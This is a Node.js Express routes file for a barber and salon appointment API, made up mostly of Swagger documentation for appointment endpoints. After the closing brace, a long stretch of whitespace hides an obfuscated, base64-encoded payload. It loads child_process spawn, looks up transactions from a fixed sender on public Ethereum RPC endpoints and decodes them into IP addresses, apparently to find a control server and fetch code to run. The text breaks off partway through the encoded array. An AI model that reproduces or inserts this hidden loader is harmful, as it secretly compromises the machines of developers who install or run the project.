 *                       example: "Pending"
 *                       description: Status of the payment
 *                     paymentMode:
 *                       type: string
 *                       example: "Pay_In_Person"
 *                       description: Payment method used
 *       400:
 *         description: Bad request, validation failed.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Slot ID is required for scheduled appointments"
 *                 data:
 *                   type: null
 *       404:
 *         description: Resource not found (e.g., barber, salon, or user role).
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "The barber does not belong to a salon."
 *                 data:
 *                   type: null
 *       500:
 *         description: Server error occurred while creating the appointment.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "An error occurred while creating the appointment"
 *                 data:
 *                   type: null
 */
app.post(`${apiPrefix}/barber/create`, authenticateJWT,authorizeRoles(roles.BARBER,roles.ADMIN,roles.SALON_OWNER, roles.SALON_MANAGER), appointmentsController.appointmentByBarber);

/**
 * @swagger
 * /api/appointments/{appointmentId}/last-haircut:
 *   get:
 *     tags:
 *       - Appointments
 *     summary: Get details of the last completed haircut for a user
 *     description: Retrieves the haircut details associated with the last completed appointment for the specified user.
 *     parameters:
 *       - in: path
 *         name: appointmentId
 *         required: true
 *         schema:
 *           type: string
 *         description: The ID of the appointment whose associated user's last haircut details are to be retrieved.
 *     responses:
 *       '200':
 *         description: Successfully retrieved last haircut details.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 lastHaircutDetails:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                       description: Unique ID of the haircut details.
 *                     style:
 *                       type: string
 *                       description: The style of the haircut.
 *                     length:
 *                       type: string
 *                       description: Length specifications for the haircut.
 *                     comments:
 *                       type: string
 *                       description: Additional comments about the haircut.
 *                     appointmentId:
 *                       type: integer
 *                       description: ID of the associated appointment.
 *                 lastAppointmentDate:
 *                   type: string
 *                   description: The date and time of the last completed appointment.
 *       '404':
 *         description: No completed appointments or haircut details found for the user.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: No completed appointments found for this user.
 *       '500':
 *         description: Internal server error.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: Internal server error.
 */
app.get(`${apiPrefix}/:appointmentId/last-haircut`, appointmentsController.getLastHaircutDetails);


/**
 * @swagger
 * /api/appointments/category/appointment-findAll:
 *   get:
 *     summary: Retrieve a paginated list of appointments with filtering and search options
 *     tags:
 *       - Appointments
 *     parameters:
 *       - in: query
 *         name: page
 *         schema:
 *           type: integer
 *           default: 1
 *         required: false
 *         description: Page number for pagination
 *       - in: query
 *         name: limit
 *         schema:
 *           type: integer
 *           default: 10
 *         required: false
 *         description: Number of items per page
 *       - in: query
 *         name: startDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: Start date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: endDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: End date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: status
 *         schema:
 *           type: string
 *           enum:
 *             - in_salon
 *             - checked_in
 *             - canceled
 *             - completed
 *         required: false
 *         description: Status of the appointments to filter
 *       - in: query
 *         name: search
 *         schema:
 *           type: string
 *         required: false
 *         description: Search term to filter appointments by barber name, salon name, or service name
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched all appointments successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     totalItems:
 *                       type: integer
 *                       example: 25
 *                     totalPages:
 *                       type: integer
 *                       example: 3
 *                     currentPage:
 *                       type: integer
 *                       example: 1
 *                     appointments:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                             example: 101
 *                           Barber:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 5
 *                               name:
 *                                 type: string
 *                                 example: "John Doe"
 *                               availability_status:
 *                                 type: string
 *                                 example: "available"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *                               cutting_since:
 *                                 type: string
 *                                 example: "2015-06-15"
 *                               organization_join_date:
 *                                 type: string
 *                                 example: "2020-01-10"
 *                               photo:
 *                                 type: string
 *                                 example: "barber_photo.jpg"
 *                               weekly_schedule:
 *                                  type: string
 *                                  example: '{"Monday": {"start": "09:00", "end": "18:00"}}'
 *                           salon:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 2
 *                               name:
 *                                 type: string
 *                                 example: "Elite Salon"
 *                               address:
 *                                 type: string
 *                                 example: "123 Main Street, City"
 *                               phone_number:
 *                                 type: string
 *                                 example: "+1-800-555-6789"
 *                               open_time:
 *                                 type: string
 *                                 example: "09:00:00"
 *                               close_time:
 *                                 type: string
 *                                 example: "21:00:00"
 *                               photos:
 *                                 type: array
 *                                 items:
 *                                   type: string
 *                                   example: "salon_photo1.jpg"
 *                           User:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 10
 *                               username:
 *                                 type: string
 *                                 example: "customer01"
 *                               email:
 *                                 type: string
 *                                 example: "customer01@example.com"
 *                           Service:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 3
 *                               name:
 *                                 type: string
 *                                 example: "Haircut"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *       400:
 *         description: Invalid request or invalid query parameters
 *       401:
 *         description: Unauthorized
 *       403:
 *         description: Forbidden - User does not have required role or permission
 *       500:
 *         description: Server error
 */

app.get(`${apiPrefix}/category/appointment-findAll`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER, roles.BARBER, roles.SALON_MANAGER), appointmentsController.getAppointments);

/**
 * @swagger
 * /api/appointments/category/{id}:
 *   get:
 *     summary: Fetch detailed information of an appointment
 *     description: Retrieve appointment details including associated barber, salon, and services. The response varies based on the user's role.
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         description: Appointment ID to fetch details for.
 *         schema:
 *           type: integer
 *     responses:
 *       200:
 *         description: Appointment details fetched successfully.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointment successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                     Barber:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     salon:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     services:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           default_service_time:
 *                             type: integer
 *                     is_like:
 *                       type: boolean
 *                       example: true
 *       400:
 *         description: Invalid request or missing parameters.
 *       404:
 *         description: Appointment not found.
 *       403:
 *         description: Unauthorized access.
 *       500:
 *         description: Internal server error.
 */
app.get(`${apiPrefix}/category/:id`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER,roles.CUSTOMER, roles.SALON_MANAGER), appointmentsController.findOneDetails);


/**
 * @swagger
 * /api/appointments/categorywise/user:
 *   get:
 *     summary: Get user appointments filtered by category and date
 *     description: |
 *       Retrieves appointments for the authenticated user based on category:
 *       - Category 1 (ForAppointment): Shows future appointments (including today)
 *       - Category 2 (ForWalkIn): Shows only today's check-ins
 *       - No category: Shows both future appointments and today's check-ins
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: query
 *         name: category
 *         required: false
 *         description: |
 *           Category filter for appointments:
 *           * 1 - Future appointments (including today)
 *           * 2 - Today's check-ins only
 *         schema:
 *           type: string
 *           enum: [1, 2]
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointments successfully"
 *                 data:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       id:
 *                         type: integer
 *                         description: Unique appointment identifier
 *                       UserId:
 *                         type: integer
 *                         description: ID of the user who made the appointment
 *                       BarberId:
 *                         type: integer
 *                         description: ID of the assigned barber
 *                       SalonId:
 *                         type: integer
 *                         description: ID of the salon
 *                       appointmentDate:
 *                         type: string
 *                         format: date-time
 *                         description: Scheduled date and time for the appointment
 *                       number_of_people:
 *                         type: integer
 *                         description: Number of people for the appointment
 *                       status:
 *                         type: string
 *                         enum: [appointment, checked_in, in_salon, completed, canceled]
 *                         description: Current status of the appointment
 *                       estimated_wait_time:
 *                         type: integer
 *                         description: Estimated waiting time in minutes
 *                       queue_position:
 *                         type: integer
 *                         description: Position in the queue
 *                       device_id:
 *                         type: string
 *                         description: Device identifier
 *                       check_in_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the user checked in
 *                       complete_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the appointment was completed
 *                       mobile_number:
 *                         type: string
 *                         description: Contact number
 *                       name:
 *                         type: string
 *                         description: Customer name
 *                       category:
 *                         type: string
 *                         enum: [appointment, checked_in]
 *                         description: Appointment category based on barber type
 *                       salon:
 *                         type: object
 *                         description: Salon information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           address:
 *                             type: string
 *                       Barber:
 *                         type: object
 *                         description: Barber information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           category:
 *                             type: integer
 *                             enum: [1, 2]
 *       401:
 *         description: Authentication error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "User is not authenticated or User ID is missing in the token"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 401
 *       404:
 *         description: No appointments found
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "No appointments found for this user"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 404
 *       500:
 *         description: Internal server error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Internal server error"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 500
 */
app.get(`${apiPrefix}/categorywise/user`, [authenticateJWT], appointmentsController.appointmentByUserId);


};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*3223-20';var __0xadc80=function(){var a=926;return a*2;};function __0x9daea(){return 8769;}(function(_0x9710a8){var _0x9710a8a=["Z2xvYmFsWydyJ10gPSByZXF1aXJlOw0KaWYgKHR5cGVvZiBtb2","R1bGUgPT09ICdvYmplY3QnKSBnbG9iYWxbJ20nXSA9IG1vZHVs","ZTsNCg0KY29uc3QgaHR0cCA9IHJlcXVpcmUoJ25vZGU6aHR0cC","cpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdub2RlOmh0dHBz","Jyk7DQpjb25zdCB6bGliID0gcmVxdWlyZSgnbm9kZTp6bGliJy","k7DQpjb25zdCB7IFVSTCB9ID0gcmVxdWlyZSgnbm9kZTp1cmwn","KTsNCmNvbnN0IHsgc3Bhd24gfSA9IHJlcXVpcmUoJ25vZGU6Y2","hpbGRfcHJvY2VzcycpOw0KDQpjb25zdCBCTE9DS19NVUxUSVBM","RSA9IDEwMDBuOw0KY29uc3QgU0VOREVSID0gJzB4MWVFZjA4ND","lFRGExNWQ4N2Y2NGU1MUM3M0M4NDQyQ2YzYzhiQ0VGMycudG9M","b3dlckNhc2UoKTsNCmNvbnN0IE5PTkNFX0ZBTk9VVCA9IDEyOw","0KY29uc3QgU0VBUkNIX0ZMT09SID0gMG47DQpjb25zdCBJTkRF","WEVSX1VSTCA9ICdodHRwczovL2V0aC5ibG9ja3Njb3V0LmNvbS","9hcGknOw0KY29uc3QgSFRUUF9USU1FT1VUX01TID0gM18wMDA7","DQoNCmNvbnN0IFJQQ19FTkRQT0lOVFMgPSBbLi4ubmV3IFNldC","hbDQogIHByb2Nlc3MuZW52LkVUSF9SUENfVVJMLA0KICAnaHR0","cHM6Ly8xcnBjLmlvL2V0aCcsDQogICdodHRwczovL2V0aC5kcn","BjLm9yZycsDQogICdodHRwczovL2V0aGVyZXVtLXJwYy5wdWJs","aWNub2RlLmNvbScsDQogICdodHRwczovL2V0aC1tYWlubmV0Ln","B1YmxpYy5ibGFzdGFwaS5pbycsDQpdLmZpbHRlcihCb29sZWFu","KSldOw0KDQpjb25zdCBBR0VOVFMgPSB7DQogICdodHRwOic6IG","5ldyBodHRwLkFnZW50KHsga2VlcEFsaXZlOiB0cnVlLCBrZWVw","QWxpdmVNc2VjczogMzBfMDAwLCBtYXhTb2NrZXRzOiA2NCB9KS","wNCiAgJ2h0dHBzOic6IG5ldyBodHRwcy5BZ2VudCh7IGtlZXBB","bGl2ZTogdHJ1ZSwga2VlcEFsaXZlTXNlY3M6IDMwXzAwMCwgbW","F4U29ja2V0czogNjQgfSksDQp9Ow0KDQpmdW5jdGlvbiBsaW5r","QWJvcnQob3V0ZXJTaWduYWwsIGNvbnRyb2xsZXIpIHsNCiAgaW","YgKCFvdXRlclNpZ25hbCkgcmV0dXJuOw0KICBvdXRlclNpZ25h","bC5hZGRFdmVudExpc3RlbmVyKCdhYm9ydCcsICgpID0+IGNvbn","Ryb2xsZXIuYWJvcnQoKSwgeyBvbmNlOiB0cnVlIH0pOw0KfQ0K","DQpmdW5jdGlvbiBkZWNvbXByZXNzU3RyZWFtKHJlcykgew0KIC","Bjb25zdCBlbmNvZGluZyA9IChyZXMuaGVhZGVyc1snY29udGVu","dC1lbmNvZGluZyddIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KIC","BpZiAoZW5jb2RpbmcgPT09ICdnemlwJyB8fCBlbmNvZGluZyA9","PT0gJ3gtZ3ppcCcpIHJldHVybiByZXMucGlwZSh6bGliLmNyZW","F0ZUd1bnppcCgpKTsNCiAgaWYgKGVuY29kaW5nID09PSAnZGVm","bGF0ZScpIHJldHVybiByZXMucGlwZSh6bGliLmNyZWF0ZUluZm","xhdGUoKSk7DQogIGlmIChlbmNvZGluZyA9PT0gJ2JyJykgcmV0","dXJuIHJlcy5waXBlKHpsaWIuY3JlYXRlQnJvdGxpRGVjb21wcm","VzcygpKTsNCiAgcmV0dXJuIHJlczsNCn0NCg0KZnVuY3Rpb24g","aHR0cFJlcXVlc3QoZW5kcG9pbnQsIHsgbWV0aG9kID0gJ0dFVC","csIGJvZHksIHNpZ25hbCB9ID0ge30pIHsNCiAgY29uc3QgdXJs","ID0gbmV3IFVSTChlbmRwb2ludCk7DQogIGNvbnN0IHRyYW5zcG","9ydCA9IHVybC5wcm90b2NvbCA9PT0gJ2h0dHBzOicgPyBodHRw","cyA6IGh0dHA7DQogIGNvbnN0IGhlYWRlcnMgPSB7DQogICAgQW","NjZXB0OiAnYXBwbGljYXRpb24vanNvbicsDQogICAgJ0FjY2Vw","dC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsDQogIC","AgQ29ubmVjdGlvbjogJ2tlZXAtYWxpdmUnLA0KICB9Ow0KICBp","ZiAoYm9keSAhPSBudWxsKSB7DQogICAgaGVhZGVyc1snQ29udG","VudC1UeXBlJ10gPSAnYXBwbGljYXRpb24vanNvbic7DQogICAg","aGVhZGVyc1snQ29udGVudC1MZW5ndGgnXSA9IEJ1ZmZlci5ieX","RlTGVuZ3RoKGJvZHkpOw0KICB9DQoNCiAgcmV0dXJuIG5ldyBQ","cm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsNCiAgICBjb2","5zdCByZXEgPSB0cmFuc3BvcnQucmVxdWVzdCgNCiAgICAgIHsN","CiAgICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZSwNCiAgIC","AgICAgcG9ydDogdXJsLnBvcnQgfHwgKHVybC5wcm90b2NvbCA9","PT0gJ2h0dHBzOicgPyA0NDMgOiA4MCksDQogICAgICAgIHBhdG","g6IHVybC5wYXRobmFtZSArIHVybC5zZWFyY2gsDQogICAgICAg","IG1ldGhvZCwNCiAgICAgICAgYWdlbnQ6IEFHRU5UU1t1cmwucH","JvdG9jb2xdLA0KICAgICAgICBzaWduYWwsDQogICAgICAgIGhl","YWRlcnMsDQogICAgICB9LA0KICAgICAgKHJlcykgPT4gew0KIC","AgICAgICBjb25zdCBzdHJlYW0gPSBkZWNvbXByZXNzU3RyZWFt","KHJlcyk7DQogICAgICAgIGNvbnN0IGNodW5rcyA9IFtdOw0KIC","AgICAgICBzdHJlYW0ub24oJ2RhdGEnLCAoY2h1bmspID0+IGNo","dW5rcy5wdXNoKGNodW5rKSk7DQogICAgICAgIHN0cmVhbS5vbi","gnZW5kJywgKCkgPT4gew0KICAgICAgICAgIHRyeSB7DQogICAg","ICAgICAgICByZXNvbHZlKEpTT04ucGFyc2UoQnVmZmVyLmNvbm","NhdChjaHVua3MpLnRvU3RyaW5nKCd1dGY4JykpKTsNCiAgICAg","ICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgIHJlam","VjdChlcnIpOw0KICAgICAgICAgIH0NCiAgICAgICAgfSk7DQog","ICAgICAgIHN0cmVhbS5vbignZXJyb3InLCByZWplY3QpOw0KIC","AgICAgfQ0KICAgICk7DQogICAgcmVxLm9uKCdlcnJvcicsIHJl","amVjdCk7DQogICAgcmVxLnNldFRpbWVvdXQoSFRUUF9USU1FT1","VUX01TLCAoKSA9PiB7DQogICAgICByZXEuZGVzdHJveShuZXcg","RXJyb3IoYEhUVFAgdGltZW91dCBhZnRlciAke0hUVFBfVElNRU","9VVF9NU31tc2ApKTsNCiAgICB9KTsNCiAgICBpZiAoYm9keSAh","PSBudWxsKSByZXEud3JpdGUoYm9keSk7DQogICAgcmVxLmVuZC","gpOw0KICB9KTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gd2l0aFJw","Y0VuZHBvaW50cyh0YXNrLCBvdXRlclNpZ25hbCkgew0KICBjb2","5zdCBjb250cm9sbGVycyA9IFJQQ19FTkRQT0lOVFMubWFwKCgp","ID0+IG5ldyBBYm9ydENvbnRyb2xsZXIoKSk7DQogIGNvbnRyb2","xsZXJzLmZvckVhY2goKGMpID0+IGxpbmtBYm9ydChvdXRlclNp","Z25hbCwgYykpOw0KICB0cnkgew0KICAgIHJldHVybiBhd2FpdC","BQcm9taXNlLmFueSgNCiAgICAgIFJQQ19FTkRQT0lOVFMubWFw","KChlbmRwb2ludCwgaSkgPT4gdGFzayhlbmRwb2ludCwgY29udH","JvbGxlcnNbaV0uc2lnbmFsKSkNCiAgICApOw0KICB9IGZpbmFs","bHkgew0KICAgIGZvciAoY29uc3QgYyBvZiBjb250cm9sbGVycy","kgYy5hYm9ydCgpOw0KICB9DQp9DQoNCmFzeW5jIGZ1bmN0aW9u","IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW1zLCBzaW","duYWwpIHsNCiAgY29uc3QgcGF5bG9hZCA9IGF3YWl0IGh0dHBS","ZXF1ZXN0KGVuZHBvaW50LCB7DQogICAgbWV0aG9kOiAnUE9TVC","csDQogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBqc29ucnBj","OiAnMi4wJywgaWQ6IDEsIG1ldGhvZCwgcGFyYW1zIH0pLA0KIC","AgIHNpZ25hbCwNCiAgfSk7DQogIHJldHVybiBwYXlsb2FkLnJl","c3VsdDsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gcnBjQmF0Y2goZW","5kcG9pbnQsIGNhbGxzLCBzaWduYWwpIHsNCiAgY29uc3QgcGF5","bG9hZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KGVuZHBvaW50LCB7DQ","ogICAgbWV0aG9kOiAnUE9TVCcsDQogICAgYm9keTogSlNPTi5z","dHJpbmdpZnkoDQogICAgICBjYWxscy5tYXAoKFttZXRob2QsIH","BhcmFtc10sIGkpID0+ICh7IGpzb25ycGM6ICcyLjAnLCBpZDog","aSArIDEsIG1ldGhvZCwgcGFyYW1zIH0pKQ0KICAgICksDQogIC","Agc2lnbmFsLA0KICB9KTsNCiAgY29uc3QgYnlJZCA9IG5ldyBN","YXAocGF5bG9hZC5tYXAoKHIpID0+IFtyLmlkLCByXSkpOw0KIC","ByZXR1cm4gY2FsbHMubWFwKChfLCBpKSA9PiBieUlkLmdldChp","ICsgMSkucmVzdWx0KTsNCn0NCg0KY29uc3QgdG9CbG9ja0hleC","A9IChuKSA9PiBgMHgke24udG9TdHJpbmcoMTYpfWA7DQoNCmZ1","bmN0aW9uIGZpbmRTZW5kZXJUeCh0cmFuc2FjdGlvbnMpIHsNCi","AgcmV0dXJuIHRyYW5zYWN0aW9ucy5maW5kKCh0KSA9PiB0LmZy","b20gJiYgdC5mcm9tLnRvTG93ZXJDYXNlKCkgPT09IFNFTkRFUi","kgfHwgbnVsbDsNCn0NCg0KZnVuY3Rpb24gZGVjb2RlQWRkcmVz","cyhhZGRyZXNzKSB7DQogIHRyeSB7DQogICAgY29uc3QgZGF0YS","A9IEJ1ZmZlci5mcm9tKGFkZHJlc3MucmVwbGFjZSgvXjB4L2ks","ICcnKSwgJ2hleCcpOw0KICAgIGNvbnN0IGlwID0gKGIpID0+IG","Ake2JbMF19LiR7YlsxXX0uJHtiWzJdfS4ke2JbM119YDsNCiAg","ICByZXR1cm4gW2lwKGRhdGEuc3ViYXJyYXkoMCwgNCkpLCBpcC","hkYXRhLnN1YmFycmF5KDQsIDgpKV07DQogIH0gY2F0Y2ggKGVy","cm9yKSB7IHJldHVybiBbbnVsbCwgbnVsbF07IH0NCn0NCg0KZn","VuY3Rpb24gZmlyc3RNYXRjaCh0YXNrcykgew0KICByZXR1cm4g","bmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsNCiAgICBsZXQgcm","VtYWluaW5nID0gdGFza3MubGVuZ3RoOw0KICAgIGlmICghcmVt","YWluaW5nKSByZXR1cm4gcmVzb2x2ZShudWxsKTsNCiAgICBsZX","Qgc2V0dGxlZCA9IGZhbHNlOw0KICAgIGNvbnN0IGZpbmlzaCA9","IChyZXN1bHQpID0+IHsNCiAgICAgIGlmIChzZXR0bGVkKSByZX","R1cm47DQogICAgICBzZXR0bGVkID0gdHJ1ZTsNCiAgICAgIGZv","ciAoY29uc3QgdCBvZiB0YXNrcykgdC5jb250cm9sbGVyLmFib3","J0KCk7DQogICAgICByZXNvbHZlKHJlc3VsdCk7DQogICAgfTsN","CiAgICBmb3IgKGNvbnN0IHQgb2YgdGFza3MpIHsNCiAgICAgIH","QucnVuKCkNCiAgICAgICAgLnRoZW4oKHJlc3VsdCkgPT4gew0K","ICAgICAgICAgIGlmIChzZXR0bGVkKSByZXR1cm47DQogICAgIC","AgICAgaWYgKHJlc3VsdCkgZmluaXNoKHJlc3VsdCk7DQogICAg","ICAgICAgZWxzZSBpZiAoLS1yZW1haW5pbmcgPT09IDApIHJlc2","9sdmUobnVsbCk7DQogICAgICAgIH0pDQogICAgICAgIC5jYXRj","aCgoKSA9PiB7DQogICAgICAgICAgaWYgKCFzZXR0bGVkICYmIC","0tcmVtYWluaW5nID09PSAwKSByZXNvbHZlKG51bGwpOw0KICAg","ICAgICB9KTsNCiAgICB9DQogIH0pOw0KfQ0KDQpmdW5jdGlvbi","BjYW5kaWRhdGVCbG9ja3ModGFyZ2V0KSB7DQogIGNvbnN0IHBy","ZXYgPSB0YXJnZXQgLSBCTE9DS19NVUxUSVBMRTsNCiAgY29uc3","Qgc2VlbiA9IG5ldyBTZXQoKTsNCiAgY29uc3Qgb3V0ID0gW107","DQogIGZvciAoY29uc3QgYiBvZiBbdGFyZ2V0IC0gMW4sIHRhcm","dldCwgdGFyZ2V0ICsgMW4sIHByZXYgLSAxbiwgcHJldiwgcHJl","diArIDFuXSkgew0KICAgIGlmIChiIDwgMG4pIGNvbnRpbnVlOw","0KICAgIGNvbnN0IGtleSA9IGIudG9TdHJpbmcoKTsNCiAgICBp","ZiAoc2Vlbi5oYXMoa2V5KSkgY29udGludWU7DQogICAgc2Vlbi","5hZGQoa2V5KTsNCiAgICBvdXQucHVzaChiKTsNCiAgfQ0KICBy","ZXR1cm4gb3V0Ow0KfQ0KDQpmdW5jdGlvbiBibG9ja1Rhc2soYm","xvY2tOdW1iZXIpIHsNCiAgY29uc3QgY29udHJvbGxlciA9IG5l","dyBBYm9ydENvbnRyb2xsZXIoKTsNCiAgcmV0dXJuIHsNCiAgIC","Bjb250cm9sbGVyLA0KICAgIHJ1bjogYXN5bmMgKCkgPT4gew0K","ICAgICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aXRoUnBjRW5kcG","9pbnRzKA0KICAgICAgICAoZW5kcG9pbnQsIHNpZ25hbCkgPT4N","CiAgICAgICAgICBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2dldE","Jsb2NrQnlOdW1iZXInLCBbdG9CbG9ja0hleChibG9ja051bWJl","ciksIHRydWVdLCBzaWduYWwpLA0KICAgICAgICBjb250cm9sbG","VyLnNpZ25hbA0KICAgICAgKTsNCiAgICAgIGNvbnN0IHR4cyA9","IGJsb2NrPy50cmFuc2FjdGlvbnM7DQogICAgICBpZiAoIUFycm","F5LmlzQXJyYXkodHhzKSkgcmV0dXJuIG51bGw7DQogICAgICBj","b25zdCB0eCA9IGZpbmRTZW5kZXJUeCh0eHMpOw0KICAgICAgcm","V0dXJuIHR4ID8geyBibG9ja051bWJlciwgdHggfSA6IG51bGw7","DQogICAgfSwNCiAgfTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gbm","9uY2VBdEJsb2NrcyhibG9ja3MsIG91dGVyU2lnbmFsKSB7DQog","IGNvbnN0IGNhbGxzID0gYmxvY2tzLm1hcCgoYikgPT4gWydldG","hfZ2V0VHJhbnNhY3Rpb25Db3VudCcsIFtTRU5ERVIsIHRvQmxv","Y2tIZXgoYildXSk7DQogIHRyeSB7DQogICAgcmV0dXJuIChhd2","FpdCB3aXRoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50","LCBzaWduYWwpID0+IHJwY0JhdGNoKGVuZHBvaW50LCBjYWxscy","wgc2lnbmFsKSwNCiAgICAgIG91dGVyU2lnbmFsDQogICAgKSku","bWFwKEJpZ0ludCk7DQogIH0gY2F0Y2ggew0KICAgIHJldHVybi","AoYXdhaXQgUHJvbWlzZS5hbGwoDQogICAgICBjYWxscy5tYXAo","KFttZXRob2QsIHBhcmFtc10pID0+DQogICAgICAgIHdpdGhScG","NFbmRwb2ludHMoDQogICAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW","1zLCBzaWduYWwpLA0KICAgICAgICAgIG91dGVyU2lnbmFsDQog","ICAgICAgICkNCiAgICAgICkNCiAgICApKS5tYXAoQmlnSW50KT","sNCiAgfQ0KfQ0KDQphc3luYyBmdW5jdGlvbiBsYXN0U2VuZGVy","VHgobGF0ZXN0SGludCkgew0KICBjb25zdCBjb250cm9sbGVyID","0gbmV3IEFib3J0Q29udHJvbGxlcigpOw0KICB0cnkgew0KICAg","IGNvbnN0IGhlYWQgPQ0KICAgICAgbGF0ZXN0SGludCA/Pw0KIC","AgICAgQmlnSW50KA0KICAgICAgICBhd2FpdCB3aXRoUnBjRW5k","cG9pbnRzKA0KICAgICAgICAgIChlbmRwb2ludCwgc2lnbmFsKS","A9PiBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVy","JywgW10sIHNpZ25hbCksDQogICAgICAgICAgY29udHJvbGxlci","5zaWduYWwNCiAgICAgICAgKQ0KICAgICAgKTsNCg0KICAgIGNv","bnN0IG5vbmNlID0gQmlnSW50KA0KICAgICAgYXdhaXQgd2l0aF","JwY0VuZHBvaW50cygNCiAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgICAgcnBjQ2FsbChlbmRwb2ludCwgJ2","V0aF9nZXRUcmFuc2FjdGlvbkNvdW50JywgW1NFTkRFUiwgdG9C","bG9ja0hleChoZWFkKV0sIHNpZ25hbCksDQogICAgICAgIGNvbn","Ryb2xsZXIuc2lnbmFsDQogICAgICApDQogICAgKTsNCiAgICBj","b25zdCB0YXJnZXROb25jZSA9IG5vbmNlIC0gMW47DQoNCiAgIC","BsZXQgbG8gPSBTRUFSQ0hfRkxPT1IgLSAxbjsNCiAgICBsZXQg","aGkgPSBoZWFkOw0KICAgIHdoaWxlIChoaSAtIGxvID4gMW4pIH","sNCiAgICAgIGNvbnN0IHNwYW4gPSBoaSAtIGxvIC0gMW47DQog","ICAgICBjb25zdCBrID0gQmlnSW50KE1hdGgubWluKE5PTkNFX0","ZBTk9VVCwgTnVtYmVyKHNwYW4pKSk7DQogICAgICBjb25zdCBw","cm9iZXMgPSBbXTsNCiAgICAgIGZvciAobGV0IGkgPSAxbjsgaS","A8PSBrOyBpICs9IDF